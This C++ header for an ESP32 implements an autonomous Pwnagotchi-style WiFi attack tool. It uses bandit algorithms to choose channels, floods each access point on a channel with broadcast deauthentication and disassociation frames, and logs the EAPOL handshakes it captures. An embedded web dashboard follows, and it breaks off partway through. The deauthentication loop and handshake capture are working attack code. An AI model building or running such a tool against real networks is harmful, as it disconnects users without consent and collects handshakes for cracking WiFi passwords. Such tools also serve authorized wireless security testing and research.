#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>
#include <math.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include "module.h"
#include "safety.h"
#include "frames.h"

// ── Pwnagotchi-inspired autonomous WiFi handshake hunter ──────────────────────
//
// Uses UCB1-Tuned + Thompson Sampling hybrid for channel selection.
// Tracks per-AP EAPOL success, PMKID attempts, and client associations.
// Autonomous AI mood system with 10 mood states and smooth transitions.
//
// Visit /pwnface in browser for the live 3D face display.

// ── Mood ──────────────────────────────────────────────────────────────────────
enum PwMood {
  PW_SLEEP=0, PW_BORED, PW_SCAN, PW_EXCITED, PW_HAPPY,
  PW_PWNING, PW_ANGRY, PW_CONFUSED, PW_INTENSE, PW_VICTORY
};
static const char* const PW_MOOD_K[] = {
  "sleep","bored","scan","excited","happy","pwning","angry","confused","intense","victory"
};
static const char* const PW_FACE_K[] = {
  "(- _ -)", "(-__-)", "(. ._)", "(^o^)", "(:D)", "(>_<)", "(X_X)", "(o.0)", "(==>)", "(^^)"
};
static const char* const PW_MSG_K[] = {
  "dreaming of packets...", "nothing here...", "scanning...", "eapol detected!",
  "handshake captured!", "pwned.", "deauths failing!", "unexpected traffic", "hunting hard", "victory lap!"
};

// ── Per-channel UCB stats (extended) ─────────────────────────────────────────
struct PwChan {
  uint8_t  ch;
  uint16_t visits;
  uint16_t eapol;        // total EAPOL frames observed
  uint16_t deauths_sent; // deauths we transmitted
  uint16_t beacons;      // beacons observed across all visits
  uint16_t clients;      // unique clients seen on this channel
  uint32_t last_eapol_ms;// millis() of last EAPOL
  float    ucb_score;    // last computed UCB score (cached for display)
  float    thompson_a;   // Thompson: Beta(a,b) successes+1
  float    thompson_b;   // Thompson: Beta(a,b) failures+1
};

// ── Per-AP record (extended) ──────────────────────────────────────────────────
#define PW_MAX_APS  48
struct PwAP {
  uint8_t  bssid[6];
  char     ssid[33];     // null-terminated SSID from beacon body
  uint8_t  ch;
  int8_t   rssi;
  uint8_t  enc;          // 0=open,1=WEP,2=WPA,3=WPA2,4=WPA3
  uint16_t clients;      // seen associated clients
  uint16_t deauths;      // deauths sent toward this AP
  uint16_t eapol_seen;   // EAPOL seen on its channel after deauth
  uint32_t last_seen_ms; // millis()
  uint32_t first_seen_ms;
  bool     active;       // seen in current epoch
};

// ── Per-client record ─────────────────────────────────────────────────────────
#define PW_MAX_CLIENTS 64
struct PwClient {
  uint8_t sta[6];       // station MAC
  uint8_t ap[6];        // last-seen AP BSSID
  uint8_t ch;
  int8_t  rssi;
  uint16_t probes;      // probe requests seen
  uint16_t data_frames; // data frames seen
  uint32_t last_seen_ms;
  bool     eapol_seen;  // did we see EAPOL from this client?
};

// ── Captured handshake record ─────────────────────────────────────────────────
#define PW_MAX_HS_LOG 24
struct PwHandshake {
  uint8_t  ap[6];
  uint8_t  client[6];
  uint8_t  ch;
  int8_t   rssi;
  uint8_t  frames;      // how many EAPOL frames captured (1-4)
  uint32_t ts_ms;
  char     ssid[33];
};

// ── Log ───────────────────────────────────────────────────────────────────────
#define PW_LOG_SZ  20
#define PW_LOG_CL  80
static char   pw_log_buf[PW_LOG_SZ][PW_LOG_CL];
static int    pw_log_head  = 0;
static int    pw_log_count = 0;

static void pw_log_add(const char* fmt, ...) {
  char tmp[PW_LOG_CL];
  va_list ap; va_start(ap, fmt); vsnprintf(tmp, PW_LOG_CL, fmt, ap); va_end(ap);
  memcpy(pw_log_buf[pw_log_head], tmp, PW_LOG_CL);
  pw_log_head = (pw_log_head + 1) % PW_LOG_SZ;
  if (pw_log_count < PW_LOG_SZ) pw_log_count++;
}

// ── State ─────────────────────────────────────────────────────────────────────
static PwChan     pw_chans[13];
static PwAP       pw_aps[PW_MAX_APS];
static PwClient   pw_clients[PW_MAX_CLIENTS];
static PwHandshake pw_hs_log[PW_MAX_HS_LOG];
static volatile int    pw_ap_count     = 0;
static volatile int    pw_client_count = 0;
static volatile int    pw_hs_log_count = 0;
static volatile uint32_t pw_hs         = 0;   // approx handshakes
static volatile uint32_t pw_total_aps  = 0;
static volatile uint32_t pw_epoch      = 0;
static volatile uint8_t  pw_cur_ch     = 1;
static volatile uint32_t pw_uptime_ms  = 0;
static volatile uint32_t pw_start_ms   = 0;
static volatile uint32_t pw_deauth_total = 0;
static volatile uint32_t pw_eapol_total  = 0;
static volatile uint32_t pw_beacon_total = 0;
static volatile uint32_t pw_data_total   = 0;
static volatile float    pw_efficiency   = 0.0f; // hs/epoch efficiency
static PwMood  pw_mood      = PW_SLEEP;
static PwMood  pw_prev_mood = PW_SLEEP;
static bool    pw_running   = false;
static TaskHandle_t pw_task = nullptr;
static volatile uint32_t pw_total_visits = 0;
static SemaphoreHandle_t pw_mutex = nullptr;

// Sniff counters reset each phase
static volatile uint16_t pw_snap_beacon = 0;
static volatile uint16_t pw_snap_eapol  = 0;
static volatile uint16_t pw_snap_data   = 0;
static volatile uint16_t pw_snap_mgmt   = 0;
static volatile uint8_t  pw_snap_last_ch = 0;

// Mood transition history (last 8 moods)
static PwMood pw_mood_hist[8];
static int pw_mood_hist_idx = 0;

// AI "personality" – aggressive or conservative hunting style
static uint8_t pw_personality = 0; // 0=balanced,1=aggressive,2=patient
static uint8_t pw_deauth_per_burst = 5;
static uint16_t pw_listen_ms = 2000;

// ── Helper: MAC to string ─────────────────────────────────────────────────────
static void pw_mac2str(const uint8_t* m, char* out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0],m[1],m[2],m[3],m[4],m[5]);
}

// ── UCB1-Tuned channel selection ──────────────────────────────────────────────
// Extends UCB1 with variance bound: score = mu + sqrt(ln(N)/n * min(1/4, V+sqrt(2*ln(N)/n)))
static int pw_next_ch_ucb() {
  for (int i = 0; i < 13; i++)
    if (pw_chans[i].visits == 0) return i;
  float best = -1.0f; int bi = 0;
  float lnT = logf((float)(pw_total_visits > 1 ? pw_total_visits : 2));
  for (int i = 0; i < 13; i++) {
    float mu  = (float)pw_chans[i].eapol / pw_chans[i].visits;
    float rat = lnT / pw_chans[i].visits;
    float var_bound = mu - mu*mu + sqrtf(2.0f * rat);
    float pad = sqrtf(rat * fminf(0.25f, var_bound));
    float s = mu + pad;
    pw_chans[i].ucb_score = s;
    if (s > best) { best = s; bi = i; }
  }
  return bi;
}

// ── Thompson Sampling channel selection ───────────────────────────────────────
// Sample from Beta(a,b) for each arm; pick argmax.
static float pw_beta_sample(float a, float b) {
  // Approximate using ratio of Gamma(a)/(Gamma(a)+Gamma(b)) via log trick
  // Use simplified approximation: mean ± exploration noise
  if (a + b < 2.0f) return (float)rand() / RAND_MAX;
  float mu = a / (a + b);
  float sigma = sqrtf(a * b / ((a+b)*(a+b)*(a+b+1.0f)));
  float z = ((float)rand()/RAND_MAX - 0.5f) * 3.46f; // approx normal [-1.73,1.73]
  float v = mu + sigma * z;
  return v < 0.0f ? 0.0f : v > 1.0f ? 1.0f : v;
}

static int pw_next_ch_thompson() {
  for (int i = 0; i < 13; i++)
    if (pw_chans[i].visits == 0) return i;
  float best = -1.0f; int bi = 0;
  for (int i = 0; i < 13; i++) {
    float s = pw_beta_sample(pw_chans[i].thompson_a, pw_chans[i].thompson_b);
    if (s > best) { best = s; bi = i; }
  }
  return bi;
}

static int pw_next_ch_idx() {
  // Alternate: even epochs use UCB, odd epochs use Thompson
  if (pw_epoch % 2 == 0) return pw_next_ch_ucb();
  return pw_next_ch_thompson();
}

// ── Thompson: update posterior after observing reward ────────────────────────
static void pw_thompson_update(int ci, bool success) {
  if (success) pw_chans[ci].thompson_a += 1.0f;
  else         pw_chans[ci].thompson_b += 1.0f;
}

// ── SSID extraction from beacon body ─────────────────────────────────────────
static void pw_extract_ssid(const uint8_t* payload, uint32_t len, char* out, int maxlen) {
  out[0] = 0;
  // 802.11 beacon: 24-byte MAC header + 8 timestamp + 2 interval + 2 caps = offset 36
  if (len < 38) return;
  const uint8_t* ie = payload + 36;
  int remain = (int)len - 36;
  while (remain >= 2) {
    uint8_t id  = ie[0];
    uint8_t elen = ie[1];
    if (remain < 2 + elen) break;
    if (id == 0) { // SSID IE
      int copylen = elen < (maxlen-1) ? elen : (maxlen-1);
      memcpy(out, ie+2, copylen);
      out[copylen] = 0;
      return;
    }
    ie += 2 + elen;
    remain -= 2 + elen;
  }
}

// ── Encryption type from RSN/WPA IEs ─────────────────────────────────────────
static uint8_t pw_extract_enc(const uint8_t* payload, uint32_t len) {
  if (len < 38) return 0;
  const uint8_t* ie = payload + 36;
  int remain = (int)len - 36;
  while (remain >= 2) {
    uint8_t id  = ie[0];
    uint8_t elen = ie[1];
    if (remain < 2 + elen) break;
    if (id == 48) return 3;      // RSN → WPA2
    if (id == 221 && elen >= 4) {
      if (ie[2]==0x00 && ie[3]==0x50 && ie[4]==0xf2 && ie[5]==0x01) return 2; // WPA1
    }
    // Check WPA3 SAE via AKM suite
    if (id == 48 && elen >= 10) {
      uint16_t akm_count = (ie[9] | (ie[10]<<8)) > 0 ? 1 : 0;
      if (akm_count && elen >= 16 && ie[13]==8) return 4; // SAE
    }
    ie += 2 + elen;
    remain -= 2 + elen;
  }
  return 0; // open
}

// ── AP tracking ───────────────────────────────────────────────────────────────
static void pw_ap_add(const uint8_t* bssid, uint8_t ch, int8_t rssi,
                       const char* ssid, uint8_t enc) {
  if (pw_mutex) xSemaphoreTake(pw_mutex, portMAX_DELAY);
  for (int i = 0; i < pw_ap_count; i++) {
    if (memcmp(pw_aps[i].bssid, bssid, 6) == 0) {
      pw_aps[i].rssi = rssi;
      pw_aps[i].ch   = ch;
      if (ssid && ssid[0]) strncpy(pw_aps[i].ssid, ssid, 32);
      pw_aps[i].last_seen_ms = millis();
      pw_aps[i].active = true;
      if (pw_mutex) xSemaphoreGive(pw_mutex);
      return;
    }
  }
  if (pw_ap_count < PW_MAX_APS) {
    int idx = pw_ap_count;
    memcpy(pw_aps[idx].bssid, bssid, 6);
    pw_aps[idx].ch   = ch;
    pw_aps[idx].rssi = rssi;
    pw_aps[idx].enc  = enc;
    pw_aps[idx].clients      = 0;
    pw_aps[idx].deauths      = 0;
    pw_aps[idx].eapol_seen   = 0;
    pw_aps[idx].last_seen_ms = millis();
    pw_aps[idx].first_seen_ms = millis();
    pw_aps[idx].active       = true;
    if (ssid) strncpy(pw_aps[idx].ssid, ssid, 32);
    else      pw_aps[idx].ssid[0] = 0;
    pw_ap_count = idx + 1;
    pw_total_aps++;
  }
  if (pw_mutex) xSemaphoreGive(pw_mutex);
}

// ── Client tracking ───────────────────────────────────────────────────────────
static void pw_client_add(const uint8_t* sta, const uint8_t* ap, uint8_t ch, int8_t rssi) {
  for (int i = 0; i < pw_client_count; i++) {
    if (memcmp(pw_clients[i].sta, sta, 6) == 0) {
      pw_clients[i].last_seen_ms = millis();
      pw_clients[i].rssi = rssi;
      pw_clients[i].ch   = ch;
      if (ap) memcpy(pw_clients[i].ap, ap, 6);
      pw_clients[i].data_frames++;
      return;
    }
  }
  if (pw_client_count < PW_MAX_CLIENTS) {
    int idx = pw_client_count;
    memcpy(pw_clients[idx].sta, sta, 6);
    if (ap) memcpy(pw_clients[idx].ap, ap, 6);
    pw_clients[idx].ch  = ch;
    pw_clients[idx].rssi = rssi;
    pw_clients[idx].data_frames = 1;
    pw_clients[idx].probes      = 0;
    pw_clients[idx].last_seen_ms = millis();
    pw_clients[idx].eapol_seen  = false;
    pw_client_count = idx + 1;
    // Increment client count on AP record
    for (int ai = 0; ai < pw_ap_count; ai++) {
      if (ap && memcmp(pw_aps[ai].bssid, ap, 6) == 0) {
        pw_aps[ai].clients++;
        pw_chans[ch-1].clients++;
        break;
      }
    }
  }
}

// ── EAPOL tracking: log approximate handshake ────────────────────────────────
static void pw_log_handshake(const uint8_t* ap, const uint8_t* sta, uint8_t ch, int8_t rssi, uint8_t frames) {
  if (pw_hs_log_count < PW_MAX_HS_LOG) {
    int idx = pw_hs_log_count;
    if (ap)  memcpy(pw_hs_log[idx].ap,     ap,  6);
    if (sta) memcpy(pw_hs_log[idx].client, sta, 6);
    pw_hs_log[idx].ch     = ch;
    pw_hs_log[idx].rssi   = rssi;
    pw_hs_log[idx].frames = frames;
    pw_hs_log[idx].ts_ms  = millis();
    // Lookup SSID from AP table
    pw_hs_log[idx].ssid[0] = 0;
    for (int i = 0; i < pw_ap_count; i++) {
      if (ap && memcmp(pw_aps[i].bssid, ap, 6) == 0) {
        strncpy(pw_hs_log[idx].ssid, pw_aps[i].ssid, 32);
        break;
      }
    }
    pw_hs_log_count++;
  } else {
    // Ring buffer — overwrite oldest
    memmove(&pw_hs_log[0], &pw_hs_log[1], sizeof(PwHandshake)*(PW_MAX_HS_LOG-1));
    int idx = PW_MAX_HS_LOG-1;
    if (ap)  memcpy(pw_hs_log[idx].ap,     ap,  6);
    if (sta) memcpy(pw_hs_log[idx].client, sta, 6);
    pw_hs_log[idx].ch     = ch;
    pw_hs_log[idx].rssi   = rssi;
    pw_hs_log[idx].frames = frames;
    pw_hs_log[idx].ts_ms  = millis();
    pw_hs_log[idx].ssid[0] = 0;
  }
}

// ── Mood AI ───────────────────────────────────────────────────────────────────
static void pw_mood_set(PwMood m) {
  if (m == pw_mood) return;
  pw_prev_mood = pw_mood;
  pw_mood = m;
  pw_mood_hist[pw_mood_hist_idx] = m;
  pw_mood_hist_idx = (pw_mood_hist_idx + 1) % 8;
}

static void pw_mood_tick(uint16_t beacons, uint16_t eapol_new, bool deauth_success) {
  if (!pw_running) { pw_mood_set(PW_SLEEP); return; }
  if (beacons == 0 && eapol_new == 0) {
    if (pw_mood == PW_BORED) pw_mood_set(PW_CONFUSED);
    else                      pw_mood_set(PW_BORED);
  } else if (eapol_new == 0 && beacons > 0 && !deauth_success) {
    pw_mood_set(PW_ANGRY);
  } else if (eapol_new == 0 && beacons > 0) {
    pw_mood_set(PW_SCAN);
  } else if (eapol_new > 0 && eapol_new < 4) {
    pw_mood_set(PW_EXCITED);
  } else if (eapol_new >= 4 && pw_hs < 5) {
    pw_mood_set(PW_HAPPY);
  } else if (eapol_new >= 4 && pw_hs >= 5 && pw_hs < 20) {
    pw_mood_set(PW_PWNING);
  } else if (pw_hs >= 20) {
    pw_mood_set(pw_epoch % 3 == 0 ? PW_VICTORY : PW_INTENSE);
  }
}

// ── Personality-based parameter adjustment ────────────────────────────────────
static void pw_apply_personality() {
  switch (pw_personality) {
    case 1: // aggressive
      pw_deauth_per_burst = 10;
      pw_listen_ms = 1500;
      pw_log_add("Mode: aggressive (burst=%u listen=%u)", pw_deauth_per_burst, pw_listen_ms);
      break;
    case 2: // patient
      pw_deauth_per_burst = 3;
      pw_listen_ms = 3500;
      pw_log_add("Mode: patient (burst=%u listen=%u)", pw_deauth_per_burst, pw_listen_ms);
      break;
    default: // balanced
      pw_deauth_per_burst = 5;
      pw_listen_ms = 2000;
      pw_log_add("Mode: balanced (burst=%u listen=%u)", pw_deauth_per_burst, pw_listen_ms);
      break;
  }
}

// ── Promiscuous callback (extended) ───────────────────────────────────────────
static void pw_rx(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* f = p->payload;
  uint32_t len = p->rx_ctrl.sig_len;
  uint8_t ch  = p->rx_ctrl.channel;
  int8_t  rssi = p->rx_ctrl.rssi;

  if (type == WIFI_PKT_MGMT && len >= 24) {
    uint8_t ft = f[0] & 0xFC;
    pw_snap_mgmt++;
    pw_beacon_total++;
    if (ft == 0x80 || ft == 0x50) { // beacon or probe response
      pw_snap_beacon++;
      char ssid[33] = {0};
      uint8_t enc = 0;
      if (ft == 0x80) {
        pw_extract_ssid(f, len, ssid, 33);
        enc = pw_extract_enc(f, len);
      }
      pw_ap_add(f + 16, ch, rssi, ssid, enc);
    } else if (ft == 0x40) { // probe request
      // Track client probes
      static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      pw_client_add(f + 10, BCAST, ch, rssi);
    }
  } else if (type == WIFI_PKT_DATA && len >= 32) {
    pw_data_total++;
    pw_snap_data++;
    bool qos = (f[0] & 0x80) != 0;
    int llc = 24 + (qos ? 2 : 0);
    if ((int)len >= llc + 8) {
      if (f[llc]==0xAA && f[llc+1]==0xAA && f[llc+2]==0x03 &&
          f[llc+6]==0x88 && f[llc+7]==0x8E) {
        pw_snap_eapol++;
        pw_eapol_total++;
        // Track which client this EAPOL came from
        const uint8_t* src = f + 10;
        const uint8_t* dst = f + 4;
        for (int i = 0; i < pw_client_count; i++) {
          if (memcmp(pw_clients[i].sta, src, 6) == 0) {
            pw_clients[i].eapol_seen = true;
            break;
          }
        }
        // Track EAPOL on the AP record
        for (int i = 0; i < pw_ap_count; i++) {
          if (memcmp(pw_aps[i].bssid, dst, 6) == 0 || memcmp(pw_aps[i].bssid, src, 6) == 0) {
            pw_aps[i].eapol_seen++;
            break;
          }
        }
        // Track client association
        pw_client_add(src, dst, ch, rssi);
      }
    }
  }
}

// ── Autonomous task (extended) ────────────────────────────────────────────────
static void pw_run_task(void*) {
  static const uint8_t BC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t fbuf[64];
  uint32_t phase_start;

  pw_log_add("Pwnface v2 awakens. Personality=%u", pw_personality);
  pw_log_add("UCB-Tuned + Thompson Sampling hybrid");
  pw_start_ms = millis();

  while (pw_running) {
    int ci = pw_next_ch_idx();
    uint8_t ch = pw_chans[ci].ch;
    pw_cur_ch = ch;
    pw_mood_set(PW_SCAN);

    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    pw_snap_last_ch = ch;

    // Phase 1 — beacon sniff (500ms)
    pw_snap_beacon = 0;
    pw_snap_eapol  = 0;
    pw_snap_data   = 0;
    phase_start = millis();
    vTaskDelay(pdMS_TO_TICKS(500));
    uint16_t beacons = pw_snap_beacon;
    pw_chans[ci].beacons += beacons;

    if (beacons == 0) {
      pw_mood_tick(0, 0, false);
      pw_chans[ci].visits++;
      pw_total_visits++;
      pw_thompson_update(ci, false);
      vTaskDelay(pdMS_TO_TICKS(100));
      continue;
    }

    // Phase 2 — deauth burst
    pw_mood_set(PW_EXCITED);
    int snap = pw_ap_count;
    int deauths_sent = 0;
    for (int burst = 0; burst < pw_deauth_per_burst; burst++) {
      for (int ai = 0; ai < snap; ai++) {
        if (pw_aps[ai].ch != ch) continue;
        // Deauth broadcast (no specific client needed)
        size_t n = f_deauth(fbuf, BC, pw_aps[ai].bssid, 7);
        esp_wifi_80211_tx(WIFI_IF_AP, fbuf, n, false);
        n = f_disassoc(fbuf, BC, pw_aps[ai].bssid, 8);
        esp_wifi_80211_tx(WIFI_IF_AP, fbuf, n, false);
        pw_chans[ci].deauths_sent += 2;
        pw_aps[ai].deauths += 2;
        pw_deauth_total += 2;
        deauths_sent += 2;
      }
      vTaskDelay(pdMS_TO_TICKS(60));
    }

    // Phase 3 — EAPOL listen
    pw_snap_eapol = 0;
    vTaskDelay(pdMS_TO_TICKS(pw_listen_ms));
    uint16_t eapol_new = pw_snap_eapol;
    pw_chans[ci].eapol += eapol_new;

    bool success = eapol_new > 0;
    pw_thompson_update(ci, success);

    if (success) {
      uint32_t sessions_new = eapol_new / 4 + (eapol_new % 4 ? 1 : 0);
      pw_hs += sessions_new;
      // Approximate source AP from recent data frames
      pw_log_handshake(nullptr, nullptr, ch, (int8_t)-60, (uint8_t)fminf(eapol_new, 4));
      pw_log_add("[%u] ch%u: %u EAPOL → ~%u hs total=%u", (unsigned)pw_epoch, ch, eapol_new, (unsigned)sessions_new, (unsigned)pw_hs);
    } else {
      if (pw_total_visits % 7 == 0) {
        pw_log_add("[%u] ch%u: %u beacons, 0 EAPOL (deauths=%u)", (unsigned)pw_epoch, ch, beacons, deauths_sent);
      }
    }

    // Update efficiency metric
    if (pw_epoch > 0) {
      pw_efficiency = (float)pw_hs / (float)pw_epoch;
    }

    pw_mood_tick(beacons, eapol_new, deauths_sent > 0);
    pw_chans[ci].visits++;
    pw_total_visits++;
    pw_uptime_ms = millis() - pw_start_ms;

    // Every 13 visits = 1 epoch
    if (pw_total_visits > 0 && pw_total_visits % 13 == 0) {
      pw_epoch++;
      pw_log_add("[epoch %u] hs=%u aps=%u clients=%u eff=%.2f", (unsigned)pw_epoch,
        (unsigned)pw_hs, (unsigned)pw_total_aps, pw_client_count, pw_efficiency);
      if (pw_epoch % 5 == 0 && pw_hs == 0) {
        // Auto-adjust personality if not finding anything
        pw_personality = (pw_personality + 1) % 3;
        pw_apply_personality();
      }
      // Mark stale APs as inactive
      uint32_t now = millis();
      for (int i = 0; i < pw_ap_count; i++) {
        if (now - pw_aps[i].last_seen_ms > 60000) pw_aps[i].active = false;
      }
    }

    vTaskDelay(pdMS_TO_TICKS(10));
  }

  pw_task = nullptr;
  vTaskDelete(nullptr);
}

// ── Face HTML page (extended with per-AP table, handshake log, stats grid) ────
static const char PW_HTML[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Pwngotchi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--red:#e8233a;--dim:#687080;--bg:#0b0d12;--surf:#1a1c22;--eink:#cdd2c8;--einktxt:#0a0b08;--ok:#00e676;--orn:#ff9800;--bdr:#262930}
body{background:var(--bg);color:#dde3ec;font-family:'Courier New',monospace;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:1.2rem 1rem 3rem;overflow-x:hidden}
h2{font-size:.72rem;letter-spacing:.4em;color:var(--dim);margin-bottom:1rem;text-transform:uppercase}
h3{font-size:.65rem;letter-spacing:.25em;color:var(--dim);margin:.8rem 0 .4rem;text-transform:uppercase;border-bottom:1px solid var(--bdr);padding-bottom:.3rem}
/* 3D Scene */
.scene{perspective:1600px;width:100%;display:flex;justify-content:center;padding:1rem 2rem 3.5rem;position:relative}
.device{position:relative;display:inline-block;transform:perspective(1400px) rotateX(12deg) rotateY(-20deg);animation:hvr 8s ease-in-out infinite;filter:drop-shadow(0 36px 52px rgba(0,0,0,.85)) drop-shadow(0 8px 12px rgba(0,0,0,.5))}
@keyframes hvr{0%,100%{transform:perspective(1400px) rotateX(12deg) rotateY(-20deg) translateY(0)}50%{transform:perspective(1400px) rotateX(14deg) rotateY(-18deg) translateY(-10px)}}
.d-sl{position:absolute;left:-26px;top:12px;width:26px;bottom:12px;background:linear-gradient(to right,#050609,#0f1015);border-radius:10px 0 0 10px}
.d-sb{position:absolute;left:12px;right:12px;bottom:-20px;height:20px;background:linear-gradient(to bottom,#0f1015,#050609);border-radius:0 0 10px 10px}
.d-btns{position:absolute;left:-26px;top:0;bottom:0;width:26px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;z-index:5}
.d-btn{width:14px;height:14px;border-radius:50%;background:#1e2130;border:1px solid #2a2d3e;cursor:pointer;transition:all .12s;display:flex;align-items:center;justify-content:center;font-size:6px;color:var(--dim);user-select:none}
.d-btn:hover{background:#2a2d3e;transform:scale(1.1)}
.d-btn:active{background:var(--red);box-shadow:0 0 8px var(--red)}
.d-btn.on{background:var(--red);box-shadow:0 0 6px var(--red)}
.d-front{position:relative;width:400px;background:var(--surf);border-radius:10px;border:1px solid #262930;box-shadow:inset 0 1px 0 rgba(255,255,255,.04),-26px 14px 0 -2px #09090e}
.d-gpio{position:absolute;top:5px;left:50%;transform:translateX(-50%);display:flex;gap:2px}
.d-pin{width:3px;height:7px;background:#b8882a;border-radius:1px 1px 0 0}
.d-leds{position:absolute;top:8px;right:12px;display:flex;gap:5px}
.led{width:7px;height:7px;border-radius:50%;background:#1e2130;transition:all .3s}
.led.r{background:var(--red);box-shadow:0 0 8px var(--red);animation:lp 1s infinite}
.led.g{background:#27ae60;box-shadow:0 0 8px #27ae60;animation:lp 2.5s infinite}
.led.b{background:#2266cc;box-shadow:0 0 8px #2266cc;animation:lp 1.5s infinite}
@keyframes lp{0%,100%{opacity:1}50%{opacity:.35}}
.d-bezel{margin:12px 48px 10px 10px;background:#0d0e12;border-radius:4px;padding:2px;border:1px solid #131519}
.eink{background:var(--eink);color:var(--einktxt);font-family:'Courier New',monospace;font-size:11px;line-height:1.4;padding:6px 8px;display:flex;flex-direction:column;gap:4px;min-height:150px;position:relative;overflow:hidden}
.eink::after{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.025) 3px,rgba(0,0,0,.025) 4px);pointer-events:none}
.e-row{display:flex;justify-content:space-between;font-weight:700;letter-spacing:.02em;font-size:10.5px}
.e-fw{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:.5rem 0}
.e-face{font-size:28px;line-height:1.3;letter-spacing:.08em;transition:transform .2s;user-select:none}
.e-face.anim{transform:scale(1.12)}
.e-moodtxt{font-size:9px;letter-spacing:.2em;margin-top:3px;color:#1e2a18;text-transform:uppercase}
.e-bar{height:4px;background:rgba(0,0,0,.2);border-radius:2px;margin:2px 0;overflow:hidden}
.e-barf{height:100%;background:#0a0b08;border-radius:2px;transition:width .5s}
.d-brand{position:absolute;bottom:7px;right:12px;font-size:9px;color:#22262e;letter-spacing:.2em}
.d-brand span{color:#3a1a1f}
.d-usb{position:absolute;right:-5px;top:50%;transform:translateY(-50%);width:5px;height:28px;background:#0a0b0e;border-radius:0 3px 3px 0}
/* Stats grid */
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:.5rem;width:100%;max-width:470px;margin-top:.7rem}
.stats2{display:grid;grid-template-columns:repeat(2,1fr);gap:.5rem;width:100%;max-width:470px;margin-top:.3rem}
.scard{background:#14161c;border:1px solid #1e2130;border-radius:6px;padding:.6rem;text-align:center}
.sv{font-size:1.4rem;font-weight:700;color:#dde3ec}
.sl{font-size:.62rem;color:var(--dim);letter-spacing:.1em;margin-top:.2rem;text-transform:uppercase}
.scard.act .sv{color:var(--red)}
.scard.ok .sv{color:var(--ok)}
.scard.orn .sv{color:var(--orn)}
/* Controls */
.ctrl{display:flex;gap:8px;margin:.8rem 0;justify-content:center;flex-wrap:wrap}
.cbtn{font-family:'Courier New',monospace;padding:.5rem 1.2rem;border-radius:4px;cursor:pointer;font-size:.75rem;letter-spacing:.12em;border:1px solid;transition:all .2s;user-select:none}
.cbtn-s{background:transparent;border-color:var(--red);color:var(--red)}
.cbtn-s:hover{background:var(--red);color:#0b0d12}
.cbtn-s.on{background:#1a0608;border-color:#661219;color:#aa2233}
.cbtn-h{background:transparent;border-color:#2a2d3e;color:var(--dim)}
.cbtn-h:hover{border-color:#687080;color:#dde3ec}
.cbtn-p{background:transparent;border-color:var(--orn);color:var(--orn);font-size:.65rem}
.cbtn-p:hover{background:var(--orn);color:#0b0d12}
/* Channel bar */
.ch-wrap{width:100%;max-width:470px;margin-top:.7rem}
.ch-title{font-size:.62rem;color:var(--dim);letter-spacing:.2em;margin-bottom:.4rem}
.ch-bar{display:flex;gap:3px;align-items:flex-end;height:60px;padding-bottom:16px}
.chb{width:14px;background:#1e2130;border-radius:3px 3px 0 0;position:relative;display:flex;align-items:flex-end;cursor:pointer}
.chbf{width:100%;background:var(--red);border-radius:2px 2px 0 0;min-height:3px;transition:height .5s}
.chb.cur .chbf{background:#ff6680}
.chl{position:absolute;bottom:-14px;left:0;right:0;font-size:8px;color:#3a4555;text-align:center}
/* AP Table */
.ap-table{width:100%;max-width:470px;margin-top:.7rem;border-collapse:collapse}
.ap-table th{font-size:.6rem;color:var(--dim);letter-spacing:.12em;text-transform:uppercase;text-align:left;padding:.3rem .4rem;border-bottom:1px solid #1e2130}
.ap-table td{font-size:.68rem;padding:.25rem .4rem;border-bottom:1px solid #131519;color:#687080}
.ap-table td:first-child{font-family:'Courier New',monospace;color:#dde3ec}
.ap-table tr.active td{background:#0d0f15}
.ap-table tr:hover td{background:#14161c}
.enc-o{color:var(--ok)}.enc-w{color:var(--orn)}.enc-2{color:#3399ff}.enc-3{color:#8855ff}
/* HS log */
.hs-row{display:grid;grid-template-columns:auto 1fr auto;gap:.5rem;padding:.25rem .4rem;border-bottom:1px solid #131519;font-size:.67rem;align-items:center}
.hs-row .hs-mac{font-family:'Courier New',monospace;color:#dde3ec}
.hs-row .hs-ssid{color:#687080;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.hs-row .hs-cnt{background:#1a0608;color:var(--red);border:1px solid #331219;border-radius:3px;padding:1px 5px;font-size:.62rem}
/* Log */
.log-wrap{width:100%;max-width:470px;margin-top:.7rem;border-top:1px solid #1e2130}
.log-title{font-size:.62rem;color:var(--dim);letter-spacing:.2em;padding:.5rem 0 .3rem}
.le{font-size:.7rem;color:#3a4555;padding:.18rem 0;border-bottom:1px solid #111520;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.le:first-child{color:#687080}
/* Personality selector */
.pers{display:flex;gap:5px;margin:.4rem 0;justify-content:center}
.pb{font-family:'Courier New',monospace;font-size:.65rem;padding:.3rem .8rem;border-radius:3px;cursor:pointer;border:1px solid #2a2d3e;background:transparent;color:var(--dim);transition:all .15s}
.pb.active{background:#1a1c22;border-color:var(--dim);color:#dde3ec}
/* Mood history bar */
.mh{display:flex;gap:3px;padding:.4rem 0;justify-content:center}
.mhd{width:18px;height:18px;border-radius:3px;background:#1e2130;border:1px solid #262930;display:flex;align-items:center;justify-content:center;font-size:9px;cursor:default;transition:all .2s}
.mhd[title]:hover{transform:scale(1.3)}
</style>
</head><body>
<h2>&#x2310;&#x25A0;_&#x25A0; Pwnagotchi v2</h2>
<div class="scene">
<div class="device" id="dev">
  <div class="d-sl"></div>
  <div class="d-sb"></div>
  <div class="d-btns">
